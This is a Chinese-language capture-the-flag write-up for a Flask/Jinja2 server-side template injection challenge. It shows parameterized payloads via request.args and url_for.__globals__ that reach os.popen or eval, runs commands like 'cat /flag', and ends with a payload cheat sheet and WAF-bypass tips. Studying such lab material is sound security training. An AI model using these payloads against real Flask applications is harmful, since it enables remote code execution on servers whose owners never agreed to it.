## 一句话概括

在 web361 的基础上更进一步：用 **`request.args.a/b/c`** 把「类名、函数名、要执行的命令」都做成 URL 参数，payload 本体里一个字符串字面量都不写；再借 **`url_for.__globals__`** 直接抵达 Flask 全局命名空间，省掉爬继承链。

## 本题情景与解题手法

### 题目形态

页面回显 `name` 参数的内容，存在 SSTI。与 web361 不同的是，本题的**思路重点在于"参数化"**：把 payload 里所有会变的部分（要用的类、要调的函数、要跑的命令）统统挪到 URL 参数里，模板本体只留固定结构。

### 第一步：用参数化的模板循环找类

先沿用 web361 的"遍历 + 判名"写法，但把**类名 `_wrap_close`、函数名 `popen`、命令 `dir` 都换成 `request.args.a/b/c`**：

```jinja2
?a=_wrap_close&b=popen&c=dir
&name={% for i in ().__class__.__base__.__subclasses__() %}
  {% if i.__name__ == request.args.a %}
    {% print i.__init__.__globals__[request.args.b](request.args.c).read() %}
  {% endif %}
{% endfor %}
```

这样做的意义：

| 位置 | 写成什么 | 好处 |
|---|---|---|
| `request.args.a` | 类名 | 被过滤了字符串也不怕，换个参数值即可 |
| `request.args.b` | 函数名（`popen` / `system` / `listdir`） | 现场可换，不用改 payload 本体 |
| `request.args.c` | 命令（`dir` / `cat /flag`） | 想跑什么随手改 |

### 第二步：改用 `url_for` 直取（更短的路）

继承链太绕时，直接拿 Flask 的全局函数 `url_for` 当跳板：

```text
?a=os&b=popen&c=cat /flag
&name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}
```

`url_for.__globals__` 就是 **Flask 应用所在的全局命名空间**，里面直接有 `os` 模块，于是：

```text
url_for.__globals__[a]  → 取 os 模块
[ b ]                   → 取 os.popen
( c ).read()            → 执行命令并读出回显
```

### 第三步：`url_for` 到底起了什么作用

原笔记专门问了这个问题，答案如下：

`url_for` 是 Flask 框架内置的**全局函数**，用于根据视图函数名生成 URL，**在所有 Flask 模板里都可以直接使用**。它的价值在于是一个"函数对象"，而函数对象带 `__globals__`：

```text
url_for → Flask 全局函数
  ↓
.__globals__ → 获取 Flask 应用的全局命名空间
  ↓
['__builtins__'] → 获取内置函数字典
  ↓
['eval'] → 拿到 eval 函数
  ↓
("__import__('os').popen('tac /f*').read()") → 执行系统命令
```

**为什么选 `url_for`**（原笔记归纳）：

1. **必然存在** —— 所有 Flask 应用里都有 `url_for`
2. **权限足够** —— 它处在应用全局命名空间中
3. **包含 `__builtins__`** —— 可以直接拿到 `eval`、`exec` 等危险函数
4. **不需要遍历类** —— 比 `__subclasses__()` 方法更直接

### 三种入口的对比

| 方法 | 优点 | 缺点 |
|---|---|---|
| `__subclasses__()` | 通用性强 | 需要遍历，较复杂 |
| `url_for` | 直接简单 | 仅限 Flask 应用 |
| `config` | 包含大量信息 | 可能被过滤 |

原笔记的总结很精辟：**`url_for` 相当于代替了 `''.__class__.__base__.__subclasses__()` 求出 object 父类以及可用函数的过程。**

```text
传统方法（复杂）：
''.__class__.__base__.__subclasses__() → 遍历几百个类 → 找到含 os 的类 → 用 os.popen 执行命令

url_for 方法（直接）：
url_for.__globals__ → 直接访问 Flask 全局命名空间 → 拿到 __builtins__ → 用 eval/exec 执行命令
```

### 注入手法一句话总结

> **把类名 / 函数名 / 命令都做成 `?a=&b=&c=` 参数**（省去 payload 里的字符串字面量）→ 模板用 `request.args.a/b/c` 引用 → 要么用 `{% for %}` 遍历子类判名，要么直接用 `url_for.__globals__[a][b](c).read()` 直达 os。

## Payload 速查

| 目的 | Payload |
|---|---|
| 参数化遍历利用 | `?a=_wrap_close&b=popen&c=dir&name={% for i in ().__class__.__base__.__subclasses__() %}{% if i.__name__ == request.args.a %}{% print i.__init__.__globals__[request.args.b](request.args.c).read() %}{% endif %}{% endfor %}` |
| url_for 直取 os | `?a=os&b=popen&c=cat /flag&name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}` |
| url_for + eval | `?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('tac /f*').read()")}}` |

## 踩坑与备注

- **参数化的真正价值**：当 `'`、`"`、`os`、`popen` 等字面量被 WAF 拦时，把字符串挪进 URL 参数就能绕。它同时也是"调试友好"的写法 —— 想换命令只改 `c=` 即可，不用动 payload。
- **`{% print %}` 不能省**：`{% if %}` 块里的表达式要显式 `print` 才有输出。
- **`()` 与 `''` 起点等价**：本题用 `().__class__.__base__...`，web361 用 `''.__class__.__base__...`，效果一致，选哪个看哪种符号没被过滤。
- **`url_for` 路线依赖 `__globals__` 里直接有 `os`**：如果目标环境没在 `url_for` 的命名空间里 import `os`，就退回 `__builtins__['__import__']('os')` 或继承链。
- **原题靶场为 `*.challenge.ctf.show` 子域**，属一次性地址，本文统一写作 `靶场地址`；URL 中命令的空格在实战里要 URL 编码为 `%20` 或 `+`。
